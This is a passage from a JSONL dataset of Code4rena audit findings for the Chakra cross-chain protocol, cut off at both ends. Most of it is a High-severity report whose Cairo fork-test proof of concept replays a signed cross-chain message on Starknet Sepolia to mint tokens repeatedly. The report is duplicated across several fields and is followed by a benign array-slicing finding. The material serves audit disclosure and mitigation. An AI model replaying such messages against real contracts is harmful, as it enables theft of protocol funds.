let settlement_contract_addrs:ContractAddress= contract_address_const::<0x0449f7dae3a8073aeee71a7203467d686a5227d90a9149a524787ccb0f5de54f>();\n    let settlement_dispatcher = IChakraSettlementDispatcher{contract_address: settlement_contract_addrs};\n    // would be calling with the same params with using the same signatures and all\n    let cross_chain_msg_id:u256 = 82534164209879964599356552878803734303950578526030081111379082455793595623651;\n    let from_chain:felt252 = 0x4368616b7261;\n    let to_chain:felt252 = 0x537461726b6e6574;\n    let from_handler:u256 = 445232236578399690027982039634994002761675653437;\n    let to_handler:ContractAddress = contract_address_const::<0x04a399c6ff072ae2e96946af915a731c4875564083df6b39e41e65c2af25f379>();\n    let sign_type:u8 = 0;\n    let sig_tuple: (felt252,felt252,bool) = (0x6cd261e253b93d5fa4d2d119ce6bb1395427c3daf3560b081bd36b34135048,0x44a123c8a32499c060617121c1b09dfc8afec982dd4abf27d45abd63b88ab4d,false);\n    let signatures = array![sig_tuple];\n    let payload_type:u8 = 5;\n    let payload = array![1, 95, 27, 243, 138, 154, 82, 64, 103, 243, 156, 169, 88, 142, 43, 183, 3, 113, 115, 180, 229, 74, 48, 79, 207, 217, 15, 129, 226, 133, 221, 162, 234, 5, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 30, 108, 62, 237, 83, 45, 74, 57, 55, 251, 225, 120, 144, 151, 57, 230, 10, 50, 126, 25, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 142, 2, 2, 205, 4, 139, 108, 203, 138, 163, 109, 93, 0, 237, 10, 169, 182, 217, 224, 136, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 5, 199, 19, 150, 75, 71, 142, 63, 31, 51, 152, 100, 49, 14, 178, 250, 216, 32, 11, 40, 170, 210, 40, 58, 167, 21, 196, 194, 123, 15, 212, 243, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 251, 208];\n\n\n    let return_val = settlement_dispatcher.receive_cross_chain_msg(cross_chain_msg_id,from_chain,to_chain,from_handler,to_handler,sign_type,signatures,payload,payload_type);\n    assert(return_val == true,'again call fail');\n\n\n    let chakraSignetBTC_sep_addrs:ContractAddress = contract_address_const::<0x05c713964b478e3f1f339864310eb2fad8200b28aad2283aa715c4c27b0fd4f3>();\n    let chakratoken_dispatcher =  IERC20Dispatcher{contract_address: chakraSignetBTC_sep_addrs};\n    let balance_its = chakratoken_dispatcher.balance_of(contract_address_const::<0x8e0202cd048b6ccb8aa36d5d00ed0aa9b6d9e088>());\n\n    println!(\"Balance of addrs after calling receive_cross_chain_msg second call: {}\",balance_its);\n    assert!(balance_its == 520000, \"no balance inc\");\n}\n\n```\nRun the `snforge test`\nThe test case passes and the balance of the receiver does the increase by `130000` every time we call with the same parameters\n```\n  tests git:(main)  snforge test\n   Compiling settlement_cairo v0.1.0 (/c4a/2024-08-chakra/cairo/handler/Scarb.toml)\n    Finished release target(s) in 15 seconds\n[WARNING] RPC node with the url https://starknet-sepolia.g.alchemy.com/v2/private_key uses incompatible version 0.6.0. Expected version: 0.7.0\n\n\nCollected 1 test(s) from settlement_cairo package\nRunning 1 test(s) from src/\nBalance of addrs before calling receive_cross_chain_msg: 260000\nBalance of addrs after calling receive_cross_chain_msg once: 390000\nBalance of addrs after calling receive_cross_chain_msg second call: 520000\n[PASS] settlement_cairo::tests::test_settlement::test_multiple_call (gas: ~1003)\nTests: 1 passed, 0 failed, 0 skipped, 0 ignored, 0 filtered out\n\nLatest block number = 174196 for url = https://starknet-sepolia.g.alchemy.com/v2/private-key\n\n```\nEvident from the code the `receive_cross_chain_msg` function in `handler/settlement.cairo` function lacks the validation or invariant mentioned of `CrossChainMsgStatus.Unknow` thus leads to process the already processed valid message again and again resulting in loss to the protocol\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/settlement.cairo#L325-L383\n", "fix_status_md": null, "other_md": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/settlement.cairo#L325-L383\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\nManual\n", "full_markdown_body": "https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/settlement.cairo#L325-L383\n\n\n# Vulnerability details\n\n## Impact\nThe impact is high as the adversary can call the `receive_cross_chain_msg` with the already processed and valid parameters and benefit from it. With such parameters, anyone can call not just the validators so it further affects the protocol. Due to the missing check if the `txId` status is `UNKNOW` the attack is very much feasible as shown in the below fork testing local POC. This also breaks the main invariant mentioned in the contest docs/readme that\n>  A cross-chain message can only be received once. The status of a received transaction inreceive_cross_txsmust be`CrossChainMsgStatus.Unknow`before it can be processed.\n\n## Proof of Concept\nBelow is the fork testing locally test case snippet and steps where the already deployed contract addresses on the `Sepolia` testnet of Starknet are used due to the nature of the bug, the attacker needs to resubmit the already processed, valid message and signatures of valid/whitelisted operators too. The sponsors have provided a notion document on the audit details page from where the contract address and other details were obtained.\n\nSuch details provided by the sponsor can be found at [https://s3labs.notion.site/Debugging-Cairo-Contracts-34f38875fd84407099c078d84da16294](https://www.notion.so/34f38875fd84407099c078d84da16294?pvs=21)\n\nThe contract address mentioned there is a bit old and got upgraded a few times and deployed new ones too so below code snippet below has the latest one\n\nStep 1: Get the deployed `settlement_handler.cairo` contract address.\n\nThis is the latest one deployed on the sepolia test net starknet chain: https://sepolia.starkscan.co/contract/0x0449f7dae3a8073aeee71a7203467d686a5227d90a9149a524787ccb0f5de54f#read-write-contract-sub-write\n\nStep 2: Already made call `receive_cross_chain_msg` to Step 1 contract with necessary parameters like txId, signatures (important), etc. Which succeed too i.e. that returned the `true`\n\nThis is the call: https://sepolia.starkscan.co/call/0x03842b8ffb248e0d2f629828c3af83ff718de72be67b3a6a5acf191ad95f4706_1_1\n\nThe mint/transfer event for the same above call\n\nhttps://sepolia.voyager.online/event/163813_0_0\n\nCall overview\n\nThe call is from the Chakra chain to starknet and the payload says to transfer the chakraBTC (`handler/btc.cairo`) deployed on the testnet chain. In the next step, we would take the same parameter for the chain locally call the `receive_cross-chain_msg` multiple times, and observe the balance increase for the address in this payload. According to the payload, the address to receive is `0x8e0202cd048b6ccb8aa36d5d00ed0aa9b6d9e088` and the amount is `130000` of chakraBTC\n\nStep 3: Forking the chain to again call the `receive_cross_chain_msg` to `settlement_handler` contract we got in Step 1.\nAdd the following into the `cairo/handler/Scarb.toml`\n```\n#snip\n[[tool.snforge.fork]]\nname = \"AGAINRECEIVE\"\n# add the private key or get from sponsor provided ./sn_foundry\nurl = \"https://starknet-sepolia.g.alchemy.com/v2/private key\"\nblock_id.tag = \"Latest\"\n```\nPaste the following test snippet in the `cairo/handler/src/tests/test_settlement.cairo`\nTool version is same as sponsors `snforge: v0.20.0`\n```\n#[test]\n#[fork(\"AGAINRECEIVE\")]\nfn test_multiple_call(){\n    // handler/settlement.cairo contract deployed address on starknet sepolia\n    let settlement_contract_addrs:ContractAddress= contract_address_const::<0x0449f7dae3a8073aeee71a7203467d686a5227d90a9149a524787ccb0f5de54f>();\n    let settlement_dispatcher = IChakraSettlementDispatcher{contract_address: settlement_contract_addrs};\n    // These parameters were obtained and transformed according to the types from the block explorer of previous call\n    let cross_chain_msg_id:u256 = 82534164209879964599356552878803734303950578526030081111379082455793595623651;\n    let from_chain:felt252 = 0x4368616b7261;\n    let to_chain:felt252 = 0x537461726b6e6574;\n    let from_handler:u256 = 445232236578399690027982039634994002761675653437;\n    let to_handler:ContractAddress = contract_address_const::<0x04a399c6ff072ae2e96946af915a731c4875564083df6b39e41e65c2af25f379>();\n    let sign_type:u8 = 0;\n    let sig_tuple: (felt252,felt252,bool) = (0x6cd261e253b93d5fa4d2d119ce6bb1395427c3daf3560b081bd36b34135048,0x44a123c8a32499c060617121c1b09dfc8afec982dd4abf27d45abd63b88ab4d,false);\n    let signatures = array![sig_tuple];\n    let payload_type:u8 = 5;\n    let payload = array![1, 95, 27, 243, 138, 154, 82, 64, 103, 243, 156, 169, 88, 142, 43, 183, 3, 113, 115, 180, 229, 74, 48, 79, 207, 217, 15, 129, 226, 133, 221, 162, 234, 5, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 30, 108, 62, 237, 83, 45, 74, 57, 55, 251, 225, 120, 144, 151, 57, 230, 10, 50, 126, 25, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 142, 2, 2, 205, 4, 139, 108, 203, 138, 163, 109, 93, 0, 237, 10, 169, 182, 217, 224, 136, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 5, 199, 19, 150, 75, 71, 142, 63, 31, 51, 152, 100, 49, 14, 178, 250, 216, 32, 11, 40, 170, 210, 40, 58, 167, 21, 196, 194, 123, 15, 212, 243, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 251, 208];\n\n    // ERC20 ckr_btc contract deployed address on starkne sepolia\n    // The original call or above params does the mints this ckrbtc token, amount 130000 to the address 0x8e0202cd048b6ccb8aa36d5d00ed0aa9b6d9e088\n    let chakraSignetBTC_sep_addrs:ContractAddress = contract_address_const::<0x05c713964b478e3f1f339864310eb2fad8200b28aad2283aa715c4c27b0fd4f3>();\n    let chakratoken_dispatcher =  IERC20Dispatcher{contract_address: chakraSignetBTC_sep_addrs};\n    // balance checking before the first resubmission of same message\n    let balance_its = chakratoken_dispatcher.balance_of(contract_address_const::<0x8e0202cd048b6ccb8aa36d5d00ed0aa9b6d9e088>());\n    println!(\"Balance of addrs before calling receive_cross_chain_msg: {}\",balance_its);\n\n    // calling receive_cross_chain_msg with necessary parameters\n    let return_val = settlement_dispatcher.receive_cross_chain_msg(cross_chain_msg_id,from_chain,to_chain,from_handler,to_handler,sign_type,signatures,payload,payload_type);\n    assert(return_val == true,'multiple call fail');\n\n    // balance checking after call should increase\n    let chakraSignetBTC_sep_addrs:ContractAddress = contract_address_const::<0x05c713964b478e3f1f339864310eb2fad8200b28aad2283aa715c4c27b0fd4f3>();\n    let chakratoken_dispatcher =  IERC20Dispatcher{contract_address: chakraSignetBTC_sep_addrs};\n    let balance_its = chakratoken_dispatcher.balance_of(contract_address_const::<0x8e0202cd048b6ccb8aa36d5d00ed0aa9b6d9e088>());\n\n    println!(\"Balance of addrs after calling receive_cross_chain_msg once: {}\",balance_its);\n    assert!(balance_its == 390000, \"no balance inc\");\n\n    // Again calling with same parameters. everything is same from above\n    let settlement_contract_addrs:ContractAddress= contract_address_const::<0x0449f7dae3a8073aeee71a7203467d686a5227d90a9149a524787ccb0f5de54f>();\n    let settlement_dispatcher = IChakraSettlementDispatcher{contract_address: settlement_contract_addrs};\n    // would be calling with the same params with using the same signatures and all\n    let cross_chain_msg_id:u256 = 82534164209879964599356552878803734303950578526030081111379082455793595623651;\n    let from_chain:felt252 = 0x4368616b7261;\n    let to_chain:felt252 = 0x537461726b6e6574;\n    let from_handler:u256 = 445232236578399690027982039634994002761675653437;\n    let to_handler:ContractAddress = contract_address_const::<0x04a399c6ff072ae2e96946af915a731c4875564083df6b39e41e65c2af25f379>();\n    let sign_type:u8 = 0;\n    let sig_tuple: (felt252,felt252,bool) = (0x6cd261e253b93d5fa4d2d119ce6bb1395427c3daf3560b081bd36b34135048,0x44a123c8a32499c060617121c1b09dfc8afec982dd4abf27d45abd63b88ab4d,false);\n    let signatures = array![sig_tuple];\n    let payload_type:u8 = 5;\n    let payload = array![1, 95, 27, 243, 138, 154, 82, 64, 103, 243, 156, 169, 88, 142, 43, 183, 3, 113, 115, 180, 229, 74, 48, 79, 207, 217, 15, 129, 226, 133, 221, 162, 234, 5, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 30, 108, 62, 237, 83, 45, 74, 57, 55, 251, 225, 120, 144, 151, 57, 230, 10, 50, 126, 25, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 142, 2, 2, 205, 4, 139, 108, 203, 138, 163, 109, 93, 0, 237, 10, 169, 182, 217, 224, 136, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 5, 199, 19, 150, 75, 71, 142, 63, 31, 51, 152, 100, 49, 14, 178, 250, 216, 32, 11, 40, 170, 210, 40, 58, 167, 21, 196, 194, 123, 15, 212, 243, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 251, 208];\n\n\n    let return_val = settlement_dispatcher.receive_cross_chain_msg(cross_chain_msg_id,from_chain,to_chain,from_handler,to_handler,sign_type,signatures,payload,payload_type);\n    assert(return_val == true,'again call fail');\n\n\n    let chakraSignetBTC_sep_addrs:ContractAddress = contract_address_const::<0x05c713964b478e3f1f339864310eb2fad8200b28aad2283aa715c4c27b0fd4f3>();\n    let chakratoken_dispatcher =  IERC20Dispatcher{contract_address: chakraSignetBTC_sep_addrs};\n    let balance_its = chakratoken_dispatcher.balance_of(contract_address_const::<0x8e0202cd048b6ccb8aa36d5d00ed0aa9b6d9e088>());\n\n    println!(\"Balance of addrs after calling receive_cross_chain_msg second call: {}\",balance_its);\n    assert!(balance_its == 520000, \"no balance inc\");\n}\n\n```\nRun the `snforge test`\nThe test case passes and the balance of the receiver does the increase by `130000` every time we call with the same parameters\n```\n  tests git:(main)  snforge test\n   Compiling settlement_cairo v0.1.0 (/c4a/2024-08-chakra/cairo/handler/Scarb.toml)\n    Finished release target(s) in 15 seconds\n[WARNING] RPC node with the url https://starknet-sepolia.g.alchemy.com/v2/private_key uses incompatible version 0.6.0. Expected version: 0.7.0\n\n\nCollected 1 test(s) from settlement_cairo package\nRunning 1 test(s) from src/\nBalance of addrs before calling receive_cross_chain_msg: 260000\nBalance of addrs after calling receive_cross_chain_msg once: 390000\nBalance of addrs after calling receive_cross_chain_msg second call: 520000\n[PASS] settlement_cairo::tests::test_settlement::test_multiple_call (gas: ~1003)\nTests: 1 passed, 0 failed, 0 skipped, 0 ignored, 0 filtered out\n\nLatest block number = 174196 for url = https://starknet-sepolia.g.alchemy.com/v2/private-key\n\n```\nEvident from the code the `receive_cross_chain_msg` function in `handler/settlement.cairo` function lacks the validation or invariant mentioned of `CrossChainMsgStatus.Unknow` thus leads to process the already processed valid message again and again resulting in loss to the protocol\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/settlement.cairo#L325-L383\n\n## Tools Used\nManual\n## Recommended Mitigation Steps\nAdd check in the `receive_cross_chain_msg` `handler/settlement.cairo` to check the cross chain status of the `txid`\n```\n assert(self.created_tx.read(cross_chain_msg_id.try_into().unwrap()).tx_status == CrossChainMsgStatus::UNKNOW, 'tx status error');\n\n```\n\n\n\n\n\n## Assessed type\n\nInvalid Validation\n", "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/settlement.cairo#L325-L383\n\n\n# Vulnerability details\n\n## Impact\nThe impact is high as the adversary can call the `receive_cross_chain_msg` with the already processed and valid parameters and benefit from it. With such parameters, anyone can call not just the validators so it further affects the protocol. Due to the missing check if the `txId` status is `UNKNOW` the attack is very much feasible as shown in the below fork testing local POC. This also breaks the main invariant mentioned in the contest docs/readme that \n>  A cross-chain message can only be received once. The status of a received transaction inreceive_cross_txsmust be`CrossChainMsgStatus.Unknow`before it can be processed.\n\n## Proof of Concept\nBelow is the fork testing locally test case snippet and steps where the already deployed contract addresses on the `Sepolia` testnet of Starknet are used due to the nature of the bug, the attacker needs to resubmit the already processed, valid message and signatures of valid/whitelisted operators too. The sponsors have provided a notion document on the audit details page from where the contract address and other details were obtained. \n\nSuch details provided by the sponsor can be found at [https://s3labs.notion.site/Debugging-Cairo-Contracts-34f38875fd84407099c078d84da16294](https://www.notion.so/34f38875fd84407099c078d84da16294?pvs=21)\n\nThe contract address mentioned there is a bit old and got upgraded a few times and deployed new ones too so below code snippet below has the latest one\n\nStep 1: Get the deployed `settlement_handler.cairo` contract address.\n\nThis is the latest one deployed on the sepolia test net starknet chain: https://sepolia.starkscan.co/contract/0x0449f7dae3a8073aeee71a7203467d686a5227d90a9149a524787ccb0f5de54f#read-write-contract-sub-write\n\nStep 2: Already made call `receive_cross_chain_msg` to Step 1 contract with necessary parameters like txId, signatures (important), etc. Which succeed too i.e. that returned the `true` \n\nThis is the call: https://sepolia.starkscan.co/call/0x03842b8ffb248e0d2f629828c3af83ff718de72be67b3a6a5acf191ad95f4706_1_1\n\nThe mint/transfer event for the same above call\n\nhttps://sepolia.voyager.online/event/163813_0_0\n\nCall overview \n\nThe call is from the Chakra chain to starknet and the payload says to transfer the chakraBTC (`handler/btc.cairo`) deployed on the testnet chain. In the next step, we would take the same parameter for the chain locally call the `receive_cross-chain_msg` multiple times, and observe the balance increase for the address in this payload. According to the payload, the address to receive is `0x8e0202cd048b6ccb8aa36d5d00ed0aa9b6d9e088` and the amount is `130000` of chakraBTC\n\nStep 3: Forking the chain to again call the `receive_cross_chain_msg` to `settlement_handler` contract we got in Step 1.\nAdd the following into the `cairo/handler/Scarb.toml`\n```\n#snip\n[[tool.snforge.fork]]\nname = \"AGAINRECEIVE\"\n# add the private key or get from sponsor provided ./sn_foundry\nurl = \"https://starknet-sepolia.g.alchemy.com/v2/private key\"\nblock_id.tag = \"Latest\"\n```\nPaste the following test snippet in the `cairo/handler/src/tests/test_settlement.cairo`\nTool version is same as sponsors `snforge: v0.20.0`\n```\n#[test]\n#[fork(\"AGAINRECEIVE\")]\nfn test_multiple_call(){\n    // handler/settlement.cairo contract deployed address on starknet sepolia\n    let settlement_contract_addrs:ContractAddress= contract_address_const::<0x0449f7dae3a8073aeee71a7203467d686a5227d90a9149a524787ccb0f5de54f>();\n    let settlement_dispatcher = IChakraSettlementDispatcher{contract_address: settlement_contract_addrs};\n    // These parameters were obtained and transformed according to the types from the block explorer of previous call\n    let cross_chain_msg_id:u256 = 82534164209879964599356552878803734303950578526030081111379082455793595623651;\n    let from_chain:felt252 = 0x4368616b7261;\n    let to_chain:felt252 = 0x537461726b6e6574;\n    let from_handler:u256 = 445232236578399690027982039634994002761675653437;\n    let to_handler:ContractAddress = contract_address_const::<0x04a399c6ff072ae2e96946af915a731c4875564083df6b39e41e65c2af25f379>();\n    let sign_type:u8 = 0;\n    let sig_tuple: (felt252,felt252,bool) = (0x6cd261e253b93d5fa4d2d119ce6bb1395427c3daf3560b081bd36b34135048,0x44a123c8a32499c060617121c1b09dfc8afec982dd4abf27d45abd63b88ab4d,false);\n    let signatures = array![sig_tuple];\n    let payload_type:u8 = 5;\n    let payload = array![1, 95, 27, 243, 138, 154, 82, 64, 103, 243, 156, 169, 88, 142, 43, 183, 3, 113, 115, 180, 229, 74, 48, 79, 207, 217, 15, 129, 226, 133, 221, 162, 234, 5, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 30, 108, 62, 237, 83, 45, 74, 57, 55, 251, 225, 120, 144, 151, 57, 230, 10, 50, 126, 25, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 142, 2, 2, 205, 4, 139, 108, 203, 138, 163, 109, 93, 0, 237, 10, 169, 182, 217, 224, 136, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 5, 199, 19, 150, 75, 71, 142, 63, 31, 51, 152, 100, 49, 14, 178, 250, 216, 32, 11, 40, 170, 210, 40, 58, 167, 21, 196, 194, 123, 15, 212, 243, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 251, 208];\n\n    // ERC20 ckr_btc contract deployed address on starkne sepolia\n    // The original call or above params does the mints this ckrbtc token, amount 130000 to the address 0x8e0202cd048b6ccb8aa36d5d00ed0aa9b6d9e088\n    let chakraSignetBTC_sep_addrs:ContractAddress = contract_address_const::<0x05c713964b478e3f1f339864310eb2fad8200b28aad2283aa715c4c27b0fd4f3>();\n    let chakratoken_dispatcher =  IERC20Dispatcher{contract_address: chakraSignetBTC_sep_addrs};\n    // balance checking before the first resubmission of same message\n    let balance_its = chakratoken_dispatcher.balance_of(contract_address_const::<0x8e0202cd048b6ccb8aa36d5d00ed0aa9b6d9e088>());\n    println!(\"Balance of addrs before calling receive_cross_chain_msg: {}\",balance_its);\n\n    // calling receive_cross_chain_msg with necessary parameters\n    let return_val = settlement_dispatcher.receive_cross_chain_msg(cross_chain_msg_id,from_chain,to_chain,from_handler,to_handler,sign_type,signatures,payload,payload_type);\n    assert(return_val == true,'multiple call fail');\n\n    // balance checking after call should increase\n    let chakraSignetBTC_sep_addrs:ContractAddress = contract_address_const::<0x05c713964b478e3f1f339864310eb2fad8200b28aad2283aa715c4c27b0fd4f3>();\n    let chakratoken_dispatcher =  IERC20Dispatcher{contract_address: chakraSignetBTC_sep_addrs};\n    let balance_its = chakratoken_dispatcher.balance_of(contract_address_const::<0x8e0202cd048b6ccb8aa36d5d00ed0aa9b6d9e088>());\n    \n    println!(\"Balance of addrs after calling receive_cross_chain_msg once: {}\",balance_its);\n    assert!(balance_its == 390000, \"no balance inc\");\n\n    // Again calling with same parameters. everything is same from above\n    let settlement_contract_addrs:ContractAddress= contract_address_const::<0x0449f7dae3a8073aeee71a7203467d686a5227d90a9149a524787ccb0f5de54f>();\n    let settlement_dispatcher = IChakraSettlementDispatcher{contract_address: settlement_contract_addrs};\n    // would be calling with the same params with using the same signatures and all\n    let cross_chain_msg_id:u256 = 82534164209879964599356552878803734303950578526030081111379082455793595623651;\n    let from_chain:felt252 = 0x4368616b7261;\n    let to_chain:felt252 = 0x537461726b6e6574;\n    let from_handler:u256 = 445232236578399690027982039634994002761675653437;\n    let to_handler:ContractAddress = contract_address_const::<0x04a399c6ff072ae2e96946af915a731c4875564083df6b39e41e65c2af25f379>();\n    let sign_type:u8 = 0;\n    let sig_tuple: (felt252,felt252,bool) = (0x6cd261e253b93d5fa4d2d119ce6bb1395427c3daf3560b081bd36b34135048,0x44a123c8a32499c060617121c1b09dfc8afec982dd4abf27d45abd63b88ab4d,false);\n    let signatures = array![sig_tuple];\n    let payload_type:u8 = 5;\n    let payload = array![1, 95, 27, 243, 138, 154, 82, 64, 103, 243, 156, 169, 88, 142, 43, 183, 3, 113, 115, 180, 229, 74, 48, 79, 207, 217, 15, 129, 226, 133, 221, 162, 234, 5, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 30, 108, 62, 237, 83, 45, 74, 57, 55, 251, 225, 120, 144, 151, 57, 230, 10, 50, 126, 25, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 142, 2, 2, 205, 4, 139, 108, 203, 138, 163, 109, 93, 0, 237, 10, 169, 182, 217, 224, 136, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 5, 199, 19, 150, 75, 71, 142, 63, 31, 51, 152, 100, 49, 14, 178, 250, 216, 32, 11, 40, 170, 210, 40, 58, 167, 21, 196, 194, 123, 15, 212, 243, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 251, 208];\n    \n\n    let return_val = settlement_dispatcher.receive_cross_chain_msg(cross_chain_msg_id,from_chain,to_chain,from_handler,to_handler,sign_type,signatures,payload,payload_type);\n    assert(return_val == true,'again call fail');\n\n    \n    let chakraSignetBTC_sep_addrs:ContractAddress = contract_address_const::<0x05c713964b478e3f1f339864310eb2fad8200b28aad2283aa715c4c27b0fd4f3>();\n    let chakratoken_dispatcher =  IERC20Dispatcher{contract_address: chakraSignetBTC_sep_addrs};\n    let balance_its = chakratoken_dispatcher.balance_of(contract_address_const::<0x8e0202cd048b6ccb8aa36d5d00ed0aa9b6d9e088>());\n    \n    println!(\"Balance of addrs after calling receive_cross_chain_msg second call: {}\",balance_its);\n    assert!(balance_its == 520000, \"no balance inc\");\n}\n\n```\nRun the `snforge test`\nThe test case passes and the balance of the receiver does the increase by `130000` every time we call with the same parameters\n```       \n  tests git:(main)  snforge test     \n   Compiling settlement_cairo v0.1.0 (/c4a/2024-08-chakra/cairo/handler/Scarb.toml)\n    Finished release target(s) in 15 seconds\n[WARNING] RPC node with the url https://starknet-sepolia.g.alchemy.com/v2/private_key uses incompatible version 0.6.0. Expected version: 0.7.0\n\n\nCollected 1 test(s) from settlement_cairo package\nRunning 1 test(s) from src/\nBalance of addrs before calling receive_cross_chain_msg: 260000\nBalance of addrs after calling receive_cross_chain_msg once: 390000\nBalance of addrs after calling receive_cross_chain_msg second call: 520000\n[PASS] settlement_cairo::tests::test_settlement::test_multiple_call (gas: ~1003)\nTests: 1 passed, 0 failed, 0 skipped, 0 ignored, 0 filtered out\n\nLatest block number = 174196 for url = https://starknet-sepolia.g.alchemy.com/v2/private-key\n\n```\nEvident from the code the `receive_cross_chain_msg` function in `handler/settlement.cairo` function lacks the validation or invariant mentioned of `CrossChainMsgStatus.Unknow` thus leads to process the already processed valid message again and again resulting in loss to the protocol\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/settlement.cairo#L325-L383\n\n## Tools Used\nManual\n## Recommended Mitigation Steps\nAdd check in the `receive_cross_chain_msg` `handler/settlement.cairo` to check the cross chain status of the `txid`\n```\n assert(self.created_tx.read(cross_chain_msg_id.try_into().unwrap()).tx_status == CrossChainMsgStatus::UNKNOW, 'tx status error');\n\n```\n\n\n\n\n\n## Assessed type\n\nInvalid Validation"}, "severity": "High", "difficulty": null, "type": "bug", "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/code-423n4/2024-08-chakra", "org": "code-423n4", "name": "2024-08-chakra", "commit": "abef77d95866f2fec93270491fc5abc9ab14f86d", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "github:code-423n4/2024-08-chakra-findings", "source_mtime": null, "report_extracted_at": "2025-11-19T10:34:16.759106+00:00", "report_extractor_version": "github-issues-0.1", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-19T10:34:16.773080+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "High", "Difficulty": null, "Type": "bug", "Finding ID": null, "Target": null, "Severity_normalized": "High"}}
{"schema_version": "0.1", "scvd_id": "SCVD-github:code-423n4/2024-08-chakra-findings-337", "doc_id": "github:code-423n4/2024-08-chakra-findings", "finding_index": 337, "page_start": null, "title": "Improper Length Calculation in u128_array_slice Function", "short_summary": null, "description_md": null, "full_markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/utils.cairo#L427-L442\n\n\n# Vulnerability details\n\nThe `u128_array_slice` function contains an improper length calculation which can lead to invalid array slicing behavior. Specifically, the line `let len = begin + end;` incorrectly calculates `len` instead of directly using the `end` parameter as the endpoint for the slice range.\n\n## Impact\nThe incorrect length calculation can cause unintended behavior and potential out-of-bounds errors. This may lead to scenarios where the function does not correctly slice the array or attempts to access array elements beyond its length, causing runtime errors and potentially compromising the stability of the contract.\n\n## Proof of Concept\nHere is the original function with the flaw:\n```cairo\nfn u128_array_slice(src: @Array<u128>, mut begin: usize, end: usize) -> Array<u128> {\n    let mut slice = ArrayTrait::new();\n@>    let len = begin + end;\n    loop {\n        if begin >= len {\n            break ();\n        }\n        if begin >= src.len() {\n            break ();\n        }\n\n        slice.append(*src[begin]);\n        begin += 1;\n    };\n    slice\n}\n```\n## Tools Used\nManual code review\n\n## Recommended Mitigation Steps\nTo fix the issue, remove the incorrect length calculation and directly use the `end` parameter to control the slicing range. Below is the corrected version of the function:\n```diff\nfn u128_array_slice(src: @Array<u128>, mut begin: usize, end: usize) -> Array<u128> {\n    let mut slice = ArrayTrait::new();\n-    let len = begin + end;\n    loop {\n-        if begin >= len {\n+        if begin >= end {\n            break ();\n        }\n        if begin >= src.len() {\n            break ();\n        }\n\n        slice.append(*src[begin]);\n        begin += 1;\n    };\n    slice\n}\n```\n\n\n## Assessed type\n\nInvalid Validation\n", "sections": {"description_md": null, "impact_md": "## Impact\nThe incorrect length calculation can cause unintended behavior and potential out-of-bounds errors. This may lead to scenarios where the function does not correctly slice the array or attempts to access array elements beyond its length, causing runtime errors and potentially compromising the stability of the contract.\n", "recommendation_md": "## 